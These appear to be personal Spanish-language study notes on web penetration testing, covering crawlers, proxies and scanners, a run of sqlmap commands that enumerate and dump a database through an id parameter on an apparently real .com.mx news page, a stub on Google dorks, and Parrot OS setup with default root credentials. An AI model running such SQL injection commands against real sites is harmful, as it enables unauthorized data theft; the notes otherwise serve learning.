1982032412345

0E9D2B79


- crawler, herramienta que te permite encontrar directorios e items existentes de uan página web
- spider, herramienta que sigue los enlaces, se puede usar para encontrar el submit dentro de una página web


WEB PENTESTIGN
Forma proactiva de hacer pruebas de pentración a un sitio o url.Puedes utilizarlo para hacer pruebas a sitios propios para evitar que alguien más lo decubra haciendo daño. Utilizaremos herramientas como Kali Linux, Parrot Security OS o Backtrack. Estas distribuciones vienen con un gran repertorio de herramientas de hacking.

Vamos a actuar desde el punto de vista del atacante.

- Herramientas importantes
	- Proxies de aplicaciones web: Software que se coloca entre el navegador y el sitio web interceptando los paquetes que fluyen entre estos.
	- Crawlers: Los "Rastreadores web" tratan de encontrar las guías ocultas en la aplicación web, lo que los hace realmente útiles son que recopilan mayor información y permiten realizar un pentest más provechoso.
	- Scaners de vulnerabilidad: Después de la recopilacion de información , se procede a realizar la búsqueda de vulnerabilidades en aplicaciones web, en las distros con las que trabajaremos hay una varidad de herramientas tipo para la intrusión.


En un login mal hecho, un password erroneo puede ocasionar errores de sintaxis que van a mostrarse en la interfaz de login. Dando inicio así a un posible ataque de sql injection


SQL INYECTION
	sqlmap -u "http://www.a.com.mx/noticias_sup.php?id=6" --dbs
	sqlmap -u "http://www.a.com.mx/noticias_sup.php?id=6" -p id --current-user --current-db
	sqlmap -u "http://www.a.com.mx/noticias_sup.php?id=6" -D base --tables
	sqlmap -u "http://www.a.com.mx/noticias_sup.php?id=6" -D base -T tabla --columns
	sqlmap -u "http://www.a.com.mx/noticias_sup.php?id=6" -D base -T tabla -C columna1,columna2,columna3 --dump	
	sqlmap -u "http://www.a.com.mx/noticias_sup.php?id=6" -D base --sql-query="select now();"




Dorks de google
	Comandos de búsqueda de google
		inurl








Para parrot:
- Other user
	root
	toor

	Cambiar la configuración del adaptador de red a NAT (Maquina virtual, adaptador de red, NAT)

	Abrir la terminal de parrot y correr el comando iceweasel
	Configurar proxy (localhost)


